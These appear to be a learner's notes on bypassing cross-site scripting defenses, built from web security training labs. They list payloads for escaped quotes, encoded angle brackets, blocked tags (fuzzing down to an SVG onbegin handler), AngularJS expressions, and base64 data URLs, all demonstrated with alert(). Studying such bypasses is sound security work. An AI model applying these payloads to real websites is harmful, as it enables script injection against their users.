
# possible defenses against XSS

* regex to ban script tags
* CSP ([[content security policy]]) rules

monitoring the input:
* validating: whether it's malicious
* sanitizing: changes part of it before further processing

# bypass defenses

* double quotes escaped:
  * [[Reflected DOM XSS |add a \ to escape the added \]]
* single quotes escaped
  * [[XSS_examples#Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped| add a \ to escape the added \]]
* double quotes html encoded:
  - [[XSS_examples#Stored XSS into anchor `href` attribute with double quotes HTML-encoded| `javascript:alert(1)`]]
* angle brackets encoded:
	* a payload without angle brackets 
		* `/?search="onmouseover="alert(1)` [[XSS_examples#angle brackets encoded| detail]]
		* `<a id="author" href="javascript:alert(1)">test</a>`
		* `onclick"alert(1)"`
		* `"onmouseover="alert(1)`
	* canonical link or access keys
		* `<link rel="canonical" href='https://0aba0085031513cc809f1c7200380018.web-security-academy.net/'>` [[XSS_examples#Reflected XSS in canonical link tag|detail]]
		* `/?' accesskey='Alt+x' onclick='alert()`
* angle brackets  and double quotes encoded
  * [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|exploiting $eval.constructor]]
* event handlers and `href` attributes blocked:
	* bf for available tags and events

* HTML context; most tags and attributes blocked:
	
  - bf allowed tags and attributes 400 vs 200: [[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| `GET /?search=<body%20$=1> HTTP/2`]]
  * bf tags: `?search=<$$>` => `SVG`
  * then bf for events: `?search=<SVG><animateTransform%20$$=1>` => `onbegin`
  * then: `<svg><animateTransform onbegin="alert()"></animateTransform></svg>` [[XSS_examples#Reflected XSS with some SVG markup allowe| detail]]

* JS context; some characters blocked in javascript URL:
  - [[XSS_examples#Reflected XSS in a javascript URL with some characters blocked| use other methods to call functions, like throw]]
  - `https://portswigger.net/research/xss-without-parentheses-and-semi-colons`
  
- use of HTML-encoding to bypass filters:
 
when the XSS context is an existing JavaScript within a quoted tag attribute
(e.g. an event handler) we can use HTML-encoding to bypass some filters.

When the browser has parsed out the HTML tags and attributes within a response,
it will perform HTML-decoding of tag attribute values before they are processed
any further but the server might not detect them.
	- [[XSS_examples#Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped| stored into onclick event with <>" htmlencoded and '\ escaped]]

* if '"<> and backtick escaped: 
	* [[XSS_examples#Reflected XSS into a JavaScript template literals, with `<>'" ` unicode escaped| use js template literals]] 

# special URL schemes:

`javascript:alert('XSS by Vickie)` like: `<iframe src=javascript:alert(1)>`

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"`
the same alert in base64 to bypass filters.